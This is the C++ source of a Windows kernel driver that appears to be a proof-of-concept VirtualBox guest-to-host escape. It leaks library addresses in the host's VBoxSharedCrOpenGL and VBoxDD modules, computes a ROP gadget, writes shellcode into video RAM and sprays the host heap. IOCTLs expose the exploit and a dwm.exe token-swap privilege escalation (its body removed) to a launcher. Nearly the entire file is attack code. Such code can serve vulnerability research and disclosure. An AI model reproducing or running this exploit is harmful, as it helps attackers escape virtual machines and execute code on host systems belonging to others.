#include <ntddk.h>
#include <aux_klib.h>
#include <string.h>
#include <VBoxMPDevExt.h>

WCHAR gExploitName[] = L"vrdpexploit";

#define DEVICE_NAME			L"\\Device\\vrdpexploit"
#define SYM_NAME			L"\\??\\vrdpexploit"
#define IOCTL_ESCALATE		CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002000 */
#define IOCTL_EXPLOIT		CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) /* 0x80002004 */

PDEVICE_OBJECT gDevice = NULL;
PEPROCESS gDwmProcess = NULL;
PVOID gOldDwmToken = NULL;

/* _Constants.cpp */
extern ULONGLONG OffsetFromOglToLeakedAddr;
extern ULONGLONG OffsetFromVboxddToLeakedAddr;
extern ULONGLONG OffsetFromOglToVramPtr;
extern ULONGLONG OffsetFromVboxddToRopGadget;

/* MyHGSMI.cpp */
extern NTSTATUS InitializeHGSMI(PVBOXWDDM_DEVICE* pDeviceOut, PVBOXMP_DEVEXT* pDevExtOut, PVBOXWDDM_CONTEXT* pContextOut);

/* VBoxMPCr.cpp */
extern NTSTATUS MyLeakAddresses(uint64_t* leaked_ogl_addr, uint64_t* leaked_vboxdd_addr, PVBOXMP_DEVEXT pDevExt, PVBOXWDDM_CONTEXT pContext);
extern NTSTATUS MyWriteShellcodeToVRAM(PHYSICAL_ADDRESS vram);
extern NTSTATUS MySpreyHeap(PVBOXMP_DEVEXT pDevExt, PVBOXWDDM_CONTEXT pContext, uint32_t hostId, uint64_t vram_ptr, uint64_t rop_1);

/* VBoxWddm.cpp */
extern PVOID vboxWddmMemAllocZero(IN SIZE_T cbSize);

NTSTATUS
Exploit(uint32_t hostId) {
	PVBOXWDDM_DEVICE pDevice = NULL;
	PVBOXMP_DEVEXT pDevExt = NULL;
	PVBOXWDDM_CONTEXT pContext = NULL; 

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Host ID received: %d\n", hostId);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Connect to HGSMI\n");
	if (InitializeHGSMI(&pDevice, &pDevExt, &pContext) != STATUS_SUCCESS) {
		return STATUS_UNSUCCESSFUL;
	}

	PVBOXMP_COMMON pCommon = VBoxCommonFromDeviceExt(pDevExt);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] VRAM base: %p; size: %08x\n", pCommon->phVRAM, pCommon->cbVRAM);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Leak a VBoxSharedCrOpenGL address\n");
	uint64_t LeakedOglAddr = 0;
	uint64_t LeakedVboxddAddr = 0;
	if (MyLeakAddresses(&LeakedOglAddr, &LeakedVboxddAddr, pDevExt, pContext) != STATUS_SUCCESS) {
		return STATUS_UNSUCCESSFUL;
	}

	uint64_t OglBase = LeakedOglAddr - OffsetFromOglToLeakedAddr;			// VBoxSharedCrOpenGL.so
	uint64_t VboxddBase = LeakedVboxddAddr - OffsetFromVboxddToLeakedAddr;	// VBoxDD.so
	uint64_t VramPtr = OglBase + OffsetFromOglToVramPtr;					// g_pvVRamBase
	uint64_t RopGadget = VboxddBase + OffsetFromVboxddToRopGadget;			
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] Leaked VBoxSharedCrOpenGL address: %p\n", LeakedOglAddr);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] Leaked VBoxDD address: %p\n", LeakedVboxddAddr);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] VBoxSharedCrOpenGL base: %p\n", OglBase);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] VBoxDD base: %p\n", VboxddBase);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+] g_pvVRamBase address: %p\n", VramPtr);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, 
		"[*] Write the shellcode to VRAM (in the case you close an RDP connection before the spraying is completed)\n");
	MyWriteShellcodeToVRAM(pCommon->phVRAM);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Spray the heap\n");
	if (MySpreyHeap(pDevExt, pContext, hostId, VramPtr, RopGadget) != STATUS_SUCCESS) {
		return STATUS_UNSUCCESSFUL;
	}

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Write the shellcode to VRAM\n");
	MyWriteShellcodeToVRAM(pCommon->phVRAM);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[*] Revert dwm.exe token\n");
	SetToken(gDwmProcess, gOldDwmToken); /* Removed for the sake of PoC */

	return STATUS_SUCCESS;
}

NTSTATUS
Escalate(DWORD launcherPid, DWORD dwmPid) {
	/* Removed for the sake of PoC */
}

/******************************************************************************
* A device exposed to the launcher
******************************************************************************/

/* On IRP_MJ_DEVICE_CONTROL */
NTSTATUS
DispatchDeviceControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);
	NTSTATUS status = STATUS_SUCCESS;

	PIO_STACK_LOCATION IoStackLoc = irp->Tail.Overlay.CurrentStackLocation;
	ULONG ioctl = IoStackLoc->Parameters.DeviceIoControl.IoControlCode;
	ULONG inBufLen = IoStackLoc->Parameters.DeviceIoControl.InputBufferLength;
	ULONG outBufLen = IoStackLoc->Parameters.DeviceIoControl.OutputBufferLength;
	
	PVOID buf = irp->AssociatedIrp.SystemBuffer;
	ULONG bytesWritten = 0;

	switch (ioctl) {

	// Input buffer:
	//	 DWORD launcherPid
	//	 DWORD dwmPid
	// Output buffer:
	//   DWORD isEscalated
	case IOCTL_ESCALATE:
		if (inBufLen != sizeof(DWORD) * 2 || outBufLen != sizeof(DWORD)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = Escalate(*((PDWORD)buf + 0), *((PDWORD)buf + 1));
		*(PDWORD)buf = status == STATUS_SUCCESS ? TRUE : FALSE;
		bytesWritten = sizeof(DWORD);

		break;

	// Input buffer:
	//   DWORD hostId
	// Output buffer:
	//   DWORD isExploited
	case IOCTL_EXPLOIT:
		if (inBufLen != sizeof(DWORD) || outBufLen != sizeof(DWORD)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		status = Exploit(*(PDWORD)buf);
		*(PDWORD)buf = status == STATUS_SUCCESS ? TRUE : FALSE;
		bytesWritten = sizeof(DWORD);

		break;

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;

	}

	irp->IoStatus.Status = status;
	irp->IoStatus.Information = bytesWritten;
	IofCompleteRequest(irp, 0);
	return status;
}

/* On IRP_MJ_CREATE and IRP_MJ_CLOSE */
NTSTATUS
DispatchCreateClose(PDEVICE_OBJECT device_object, PIRP irp) {
	UNREFERENCED_PARAMETER(device_object);

	irp->IoStatus.Information = 0;
	irp->IoStatus.Status = STATUS_SUCCESS;
	IofCompleteRequest(irp, 0);
	return STATUS_SUCCESS;
}

/* Create a device and a symbolic link to it */
NTSTATUS
SetupDevice(PDRIVER_OBJECT driverObject) {
	NTSTATUS status = STATUS_SUCCESS;

	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
	status = IoCreateDevice(driverObject, 0 /* DeviceExtensionSize */, &deviceName, FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN, FALSE /* Exclusive */, &gDevice);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	UNICODE_STRING symName = RTL_CONSTANT_STRING(SYM_NAME);
	status = IoCreateSymbolicLink(&symName, &deviceName);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	driverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
	driverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

	return STATUS_SUCCESS;
}

extern "C"
NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
	UNREFERENCED_PARAMETER(registryPath);
	NTSTATUS status;

	AuxKlibInitialize();
	if ((status = SetupDevice(driverObject)) != STATUS_SUCCESS) {
		return status;
	}

	return STATUS_SUCCESS;
}
